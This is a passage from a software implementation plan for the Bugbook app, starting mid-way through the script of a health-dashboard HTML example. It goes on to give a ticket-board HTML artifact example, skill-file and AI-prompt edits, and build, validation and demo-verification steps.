  const idx = [...new Set([0, Math.floor((rows.length - 1) / 2), rows.length - 1])];
  return idx.map(i =>
    `<text x="${scaleX(i, rows.length)}" y="${H - 6}" class="tick" text-anchor="middle">${rows[i].date.slice(5)}</text>`
  ).join("");
}

function sleepChart(rows) {
  const hi = Math.max(9, ...rows.map(r => r.sleep));
  let s = frame(0, hi, v => v.toFixed(0) + "h");
  rows.forEach((r, i) => {
    const [x, w] = bandX(i, rows.length);
    const light = Math.max(0, r.sleep - r.deep - r.rem);
    let y = scaleY(0, 0, hi);
    for (const [v, cls] of [[r.deep, "deep"], [r.rem, "rem"], [light, "light"]]) {
      const h = IH * v / hi;
      y -= h;
      s += `<rect x="${x}" y="${y}" width="${w}" height="${h}" class="${cls}"><title>${r.date} ${cls}: ${v.toFixed(1)}h (total ${r.sleep.toFixed(1)}h)</title></rect>`;
    }
  });
  return svg(s + dayLabels(rows));
}

function rhrChart(rows) {
  const lo = Math.min(...rows.map(r => r.rhr)) - 2, hi = Math.max(...rows.map(r => r.rhr)) + 2;
  let s = frame(lo, hi, v => Math.round(v));
  s += `<polyline points="${rows.map((r, i) => `${scaleX(i, rows.length)},${scaleY(r.rhr, lo, hi)}`).join(" ")}" class="line rhr"/>`;
  rows.forEach((r, i) => {
    s += `<circle cx="${scaleX(i, rows.length)}" cy="${scaleY(r.rhr, lo, hi)}" r="2.5" class="dot"><title>${r.date}: ${r.rhr} bpm</title></circle>`;
  });
  return svg(s + dayLabels(rows));
}

function stepsChart(rows) {
  const hi = Math.max(...rows.map(r => r.steps)) * 1.1;
  let s = frame(0, hi, v => Math.round(v / 1000) + "k");
  rows.forEach((r, i) => {
    const [x, w] = bandX(i, rows.length);
    const y = scaleY(r.steps, 0, hi);
    s += `<rect x="${x}" y="${y}" width="${w}" height="${scaleY(0, 0, hi) - y}" class="steps" rx="2"><title>${r.date}: ${r.steps.toLocaleString()} steps</title></rect>`;
  });
  return svg(s + dayLabels(rows));
}

function energyChart(rows) {
  let s = frame(0, 100, v => Math.round(v));
  rows.forEach((r, i) => {
    const [x, w] = bandX(i, rows.length);
    const yTop = scaleY(r.bbMax, 0, 100), yBot = scaleY(r.bbMin, 0, 100);
    s += `<rect x="${x}" y="${yTop}" width="${w}" height="${yBot - yTop}" class="bb" rx="2"><title>${r.date} body battery ${r.bbMin}–${r.bbMax}</title></rect>`;
  });
  s += `<polyline points="${rows.map((r, i) => `${scaleX(i, rows.length)},${scaleY(r.stress, 0, 100)}`).join(" ")}" class="line stress"/>`;
  return svg(s + dayLabels(rows));
}

const card = (label, value, sub) =>
  `<div class="card"><div class="label">${label}</div><div class="value">${value}</div><div class="sub">${sub}</div></div>`;

function render() {
  const rows = ALL.slice(-days);
  const avg = k => rows.reduce((a, r) => a + r[k], 0) / rows.length;
  document.getElementById("stats").innerHTML = [
    card("Sleep", avg("sleep").toFixed(1) + " h", "deep " + avg("deep").toFixed(1) + " · REM " + avg("rem").toFixed(1)),
    card("Resting HR", Math.round(avg("rhr")) + " bpm",
      "range " + Math.min(...rows.map(r => r.rhr)) + "–" + Math.max(...rows.map(r => r.rhr))),
    card("Steps", Math.round(avg("steps")).toLocaleString(),
      "total " + rows.reduce((a, r) => a + r.steps, 0).toLocaleString()),
    card("Stress", Math.round(avg("stress")), "avg of daily averages"),
    card("Body Battery", Math.round(avg("bbMax")), "avg daily peak"),
  ].join("");
  document.getElementById("sleep").innerHTML = sleepChart(rows);
  document.getElementById("rhr").innerHTML = rhrChart(rows);
  document.getElementById("steps").innerHTML = stepsChart(rows);
  document.getElementById("energy").innerHTML = energyChart(rows);
}

document.querySelectorAll("#toggle button").forEach(btn => {
  btn.addEventListener("click", () => {
    days = Number(btn.dataset.days);
    document.querySelectorAll("#toggle button").forEach(b => b.classList.toggle("active", b === btn));
    render();
  });
});
matchMedia("(prefers-color-scheme: dark)").addEventListener("change", render);
render();
</script>
</body>
</html>
```

Create `plugins/bugbook/skills/artifact/examples/ticket-board.html` with exactly this content:

```html
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="bugbook-artifact" content="1">
<meta name="bugbook-title" content="Ticket Board — Sample Snapshot">
<meta name="bugbook-icon" content="sf:square.grid.3x1.below.line.grid.1x2">
<meta name="bugbook-generator" content="bugbook-skill/artifact-example">
<style>
:root {
  --bg: #ffffff; --fg: #1d1d1f; --muted: #6e6e73; --card: #f5f5f7; --col: #ececf0;
  --border: #d2d2d7; --accent: #0a84ff; --p0: #ff453a; --p1: #ff9f0a; --p2: #8e8e93;
}
@media (prefers-color-scheme: dark) {
  :root {
    --bg: #1c1c1e; --fg: #f5f5f7; --muted: #98989d; --card: #3a3a3c; --col: #2c2c2e;
    --border: #48484a;
  }
}
* { box-sizing: border-box; margin: 0; }
body { background: var(--bg); color: var(--fg); padding: 20px;
       font: 14px/1.4 -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif; }
header { display: flex; flex-wrap: wrap; gap: 10px; align-items: center; margin-bottom: 12px; }
h1 { font-size: 20px; margin-right: auto; }
#q { background: var(--col); color: var(--fg); border: 1px solid var(--border);
     border-radius: 8px; padding: 6px 10px; font: inherit; width: 200px; }
#chips { display: flex; flex-wrap: wrap; gap: 6px; margin-bottom: 14px; }
.chip { background: var(--col); color: var(--muted); border: 1px solid var(--border);
        border-radius: 999px; padding: 3px 11px; font-size: 12px; cursor: pointer; }
.chip.on { background: var(--accent); border-color: var(--accent); color: #fff; }
#board { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; align-items: start; }
.column { background: var(--col); border-radius: 10px; padding: 8px; min-height: 120px; }
.column h2 { font-size: 12px; color: var(--muted); text-transform: uppercase;
             letter-spacing: 0.4px; padding: 2px 4px 8px; }
.column.dragover { outline: 2px dashed var(--accent); outline-offset: -2px; }
.ticket { background: var(--card); border-radius: 8px; padding: 8px 10px; margin-bottom: 8px;
          cursor: grab; border: 1px solid var(--border); }
.ticket .title { font-size: 13px; margin-bottom: 6px; }
.meta { display: flex; flex-wrap: wrap; gap: 6px; align-items: center;
        font-size: 11px; color: var(--muted); }
.badge { font-weight: 700; }
.badge.P0 { color: var(--p0); } .badge.P1 { color: var(--p1); } .badge.P2 { color: var(--p2); }
.label { background: var(--col); border-radius: 4px; padding: 1px 5px; }
footer { margin-top: 16px; font-size: 11px; color: var(--muted); }
#toast { position: fixed; left: 50%; bottom: 24px; transform: translateX(-50%);
         background: var(--fg); color: var(--bg); border-radius: 8px; padding: 8px 14px;
         font-size: 12px; opacity: 0; transition: opacity 0.25s; pointer-events: none; }
#toast.show { opacity: 1; }
@media (max-width: 640px) { #board { grid-template-columns: repeat(2, 1fr); } }
</style>
</head>
<body>
<header>
  <h1>Agent Tickets</h1>
  <input id="q" type="search" placeholder="Search title or ID…">
</header>
<div id="chips"></div>
<main id="board"></main>
<footer>Snapshot — write-back arrives with the Level 2 bridge. Drag moves cards in this view only.</footer>
<div id="toast"></div>

<script type="application/json" id="data">
[
{"id":"BB-141","title":"Sidebar loses expansion state after rename","status":"To Do","priority":"P1","labels":["sidebar","bug"],"assignee":"agent"},
{"id":"BB-142","title":"Add CSV export to database views","status":"To Do","priority":"P2","labels":["databases","feature"],"assignee":"max"},
{"id":"BB-143","title":"Slash menu flickers on first open","status":"To Do","priority":"P2","labels":["editor","bug"],"assignee":"agent"},
{"id":"BB-144","title":"Backlinks pane misses links inside toggles","status":"In Progress","priority":"P1","labels":["backlinks","bug"],"assignee":"agent"},
{"id":"BB-145","title":"Weekly review health artifact","status":"In Progress","priority":"P1","labels":["skills","feature"],"assignee":"agent"},
{"id":"BB-146","title":"Drag-drop rows between boards","status":"In Progress","priority":"P2","labels":["boards","feature"],"assignee":"max"},
{"id":"BB-147","title":"Artifact pane live-reload debounce","status":"In Review","priority":"P0","labels":["artifacts","feature"],"assignee":"agent"},
{"id":"BB-148","title":"Fix date filter off-by-one on week boundaries","status":"In Review","priority":"P0","labels":["databases","bug"],"assignee":"agent"},
{"id":"BB-149","title":"Calendar pane: double events after sync","status":"Done","priority":"P1","labels":["calendar","bug"],"assignee":"agent"},
{"id":"BB-150","title":"Search: rank title matches above body","status":"Done","priority":"P2","labels":["search","feature"],"assignee":"max"},
{"id":"BB-151","title":"Mail triage keyboard shortcuts","status":"Done","priority":"P2","labels":["mail","feature"],"assignee":"agent"},
{"id":"BB-152","title":"Quick capture hotkey opens wrong workspace","status":"Done","priority":"P1","labels":["capture","bug"],"assignee":"max"}
]
</script>
<script>
const TICKETS = JSON.parse(document.getElementById("data").textContent);
const STATUSES = ["To Do", "In Progress", "In Review", "Done"];
const state = { q: "", prio: new Set(), labels: new Set() };

const allPrios = [...new Set(TICKETS.map(t => t.priority))].sort();
const allLabels = [...new Set(TICKETS.flatMap(t => t.labels))].sort();

function renderChips() {
  const chip = (kind, value, on) =>
    `<button class="chip${on ? " on" : ""}" data-kind="${kind}" data-value="${value}">${value}</button>`;
  document.getElementById("chips").innerHTML =
    allPrios.map(p => chip("prio", p, state.prio.has(p))).join("") +
    allLabels.map(l => chip("labels", l, state.labels.has(l))).join("");
}

function matches(t) {
  const q = state.q.trim().toLowerCase();
  if (q && !(t.title.toLowerCase().includes(q) || t.id.toLowerCase().includes(q))) return false;
  if (state.prio.size && !state.prio.has(t.priority)) return false;
  if (state.labels.size && !t.labels.some(l => state.labels.has(l))) return false;
  return true;
}

function ticketCard(t) {
  return `<div class="ticket" draggable="true" data-id="${t.id}">
    <div class="title">${t.title}</div>
    <div class="meta">
      <span class="badge ${t.priority}">${t.priority}</span>
      <span>${t.id}</span>
      ${t.labels.map(l => `<span class="label">${l}</span>`).join("")}
      <span>@${t.assignee}</span>
    </div>
  </div>`;
}

function renderBoard() {
  const visible = TICKETS.filter(matches);
  document.getElementById("board").innerHTML = STATUSES.map(status => {
    const cards = visible.filter(t => t.status === status);
    return `<section class="column" data-status="${status}">
      <h2>${status} · ${cards.length}</h2>
      ${cards.map(ticketCard).join("")}
    </section>`;
  }).join("");
  wireDrag();
}

function toast(msg) {
  const el = document.getElementById("toast");
  el.textContent = msg;
  el.classList.add("show");
  clearTimeout(toast.timer);
  toast.timer = setTimeout(() => el.classList.remove("show"), 2200);
}

function wireDrag() {
  document.querySelectorAll(".ticket").forEach(card => {
    card.addEventListener("dragstart", e => e.dataTransfer.setData("text/plain", card.dataset.id));
  });
  document.querySelectorAll(".column").forEach(col => {
    col.addEventListener("dragover", e => { e.preventDefault(); col.classList.add("dragover"); });
    col.addEventListener("dragleave", () => col.classList.remove("dragover"));
    col.addEventListener("drop", e => {
      e.preventDefault();
      col.classList.remove("dragover");
      const id = e.dataTransfer.getData("text/plain");
      const ticket = TICKETS.find(t => t.id === id);
      if (ticket && ticket.status !== col.dataset.status) {
        ticket.status = col.dataset.status;
        renderBoard();
        toast(`${id} → ${ticket.status} (snapshot only — not written back)`);
      }
    });
  });
}

document.getElementById("q").addEventListener("input", e => { state.q = e.target.value; renderBoard(); });
document.getElementById("chips").addEventListener("click", e => {
  const btn = e.target.closest(".chip");
  if (!btn) return;
  const set = state[btn.dataset.kind];
  set.has(btn.dataset.value) ? set.delete(btn.dataset.value) : set.add(btn.dataset.value);
  renderChips();
  renderBoard();
});

renderChips();
renderBoard();
</script>
</body>
</html>
```

Verify both immediately with the CLI:

```bash
swift run BugbookCLI artifact validate "$PWD/plugins/bugbook/skills/artifact/examples/health-dashboard.html" --workspace "$(mktemp -d)"
swift run BugbookCLI artifact validate "$PWD/plugins/bugbook/skills/artifact/examples/ticket-board.html" --workspace "$(mktemp -d)"
```

Expected: both report `"valid": true` with zero errors.

- [ ] **Step 10.3: Update the wreview skill**

In `plugins/bugbook/skills/wreview/SKILL.md`, three edits (anchor on section titles; line numbers ~84/86/100/111 are hints):

(1) Insert a new section after the Garmin failure paragraph (ends "…skip the Health section entirely if there is no usable data.") and before `### 1b. Create Review Row`:

````markdown
### 1b. Health Artifact (optional)

If Garmin returned 3+ days of real data, build an interactive health artifact
before creating the review row. Read the artifact skill
(`plugins/bugbook/skills/artifact/SKILL.md`) for the authoring contract; start
from its `examples/health-dashboard.html`, replace the embedded
`<script type="application/json" id="data">` payload with this week's daily
rows (date, sleep/deep/REM hours, resting HR, steps, stress, body battery
min/max), and set `bugbook-title` to "Health — {week}" and `bugbook-generator`
to "claude-code/wreview".

```bash
bugbook artifact create "Weekly Reviews/_artifacts/{YYYY}-W{WW}-health.html" \
  --workspace "$WS" --content-file /tmp/health.html
```

Fix any validation errors it reports (usually an external reference that must
be inlined) and re-run. Keep the `markdown_link` line from the output for the
Health section below. If creation fails twice, skip the artifact and continue
— the artifact is optional, the review is not.
````

(2) Renumber the displaced sections: `### 1b. Create Review Row` → `### 1c. Create Review Row`, and `### 1c. Show Summary` → `### 1d. Show Summary`.

(3) Replace the Health pre-fill bullet:

```diff
-- **Observe > Health** — one short line of Garmin weekly averages: avg sleep (hours + score), avg resting HR, avg steps, latest weight, and workout count. Numbers only — no daily breakdown, no trend commentary, no flagging. Skip the section entirely if there's no usable data for the week.
+- **Observe > Health** — one short line of Garmin weekly averages: avg sleep (hours + score), avg resting HR, avg steps, latest weight, and workout count. Numbers only in the text — no daily breakdown, no trend commentary, no flagging; the daily time-series lives in the health artifact (1b). If the artifact was created, end the line with its `markdown_link`. Skip the section entirely if there's no usable data for the week.
```

- [ ] **Step 10.4: Reword the AiService HTML ban**

`Sources/Bugbook/Services/AiService.swift:67` — single-line replacement inside `systemInstruction` (this prompt runs on every inline AI edit, keep it tight; the editor still doesn't render inline HTML, so the ban on note content stands — only the false "This app does NOT render HTML" claim goes):

```diff
-NEVER use HTML tags like <details>, <summary>, <strong>, etc. This app does NOT render HTML.
+NEVER use HTML tags like <details>, <summary>, <strong>, etc. in note content — notes are pure markdown and the editor does not render inline HTML. Rich or interactive HTML belongs in separate .html artifact files created with the bugbook CLI, never inline in a note.
```

- [ ] **Step 10.5: Verify and commit**

Run: `swift build` (AiService change compiles) and re-run the two `artifact validate` commands from 10.2. Open both demos in the app (drop them into the scratch workspace): health dashboard renders charts + 7d/14d toggle + dark mode; ticket board filters/searches/drags with the snapshot toast.

```bash
git add plugins/bugbook/skills/artifact plugins/bugbook/skills/wreview/SKILL.md Sources/Bugbook/Services/AiService.swift
git commit -m "Add artifact authoring skill with demo examples and update wreview and AI prompt"
```

---

## Task 11: Full verification gate (design doc §7)

- [ ] **Step 11.1: Full local gate**

```bash
swift build && swift test && bash scripts/smoke-cli.sh
```

Expected: clean build, all tests pass (including the WebKit live suite locally), `ALL_SMOKE_TESTS_PASSED`.

- [ ] **Step 11.2: Xcode project build**

```bash
cd macos && xcodegen generate && xcodebuild -project Bugbook.xcodeproj -scheme BugbookApp -configuration Debug build && cd ..
```

xcodegen globs `../Sources/Bugbook` automatically (`macos/project.yml`) — this catches any file the SwiftPM build resolved but the app project missed. No `project.yml` edits expected.

- [ ] **Step 11.3: End-to-end demo run (design doc §7.4)**

Scratch workspace with both demos + hostile fixture; `swift run Bugbook` (WebKit path, no CEF needed):

```bash
SCRATCH=$(mktemp -d)/Workspace && mkdir -p "$SCRATCH/Weekly Review"
printf '# Weekly Review\n\n[[sleep-trends]]\n' > "$SCRATCH/Weekly Review.md"
cp plugins/bugbook/skills/artifact/examples/health-dashboard.html "$SCRATCH/Weekly Review/sleep-trends.html"
cp plugins/bugbook/skills/artifact/examples/ticket-board.html "$SCRATCH/"
cp Tests/BugbookTests/Fixtures/hostile-artifact.html "$SCRATCH/"
swift run Bugbook
```

Checklist: artifacts in sidebar (dashboard nested under Weekly Review.md); charts/board render and interact; wiki link `[[sleep-trends]]` opens the pane; hostile artifact reports every probe blocked; external link click → native confirmation sheet; `touch`-editing an open artifact live-reloads it; rename/duplicate/trash behave.

- [ ] **Step 11.4: Final commit (if any stragglers) — done**

---

## Out of scope (deliberate, from the design doc)

Level 2 bridge (`window.bugbook.query`, consent banner, grants store, audit log), Level 3 mutations, `_schema.json` `views` html type, inline `<!-- artifact: -->` editor embeds, iOS rendering, artifact search/backlink indexing, template/mention pickers for artifacts, BrowserManager reuse, multi-file artifacts. The consent-banner slot comment in `ArtifactPaneView` and the capability-block parsing in `ArtifactManifest` are the only forward-compatibility hooks built now.

## Execution

Two options once approved: **subagent-driven** (fresh subagent per task, review between tasks — recommended; use superpowers:subagent-driven-development) or **inline** (superpowers:executing-plans, batch with checkpoints). Tasks 1→6 are sequential (native); Task 7 depends only on Task 2; Tasks 8–10 depend on Task 7; Task 10 is otherwise independent of 3–6; Task 11 last.




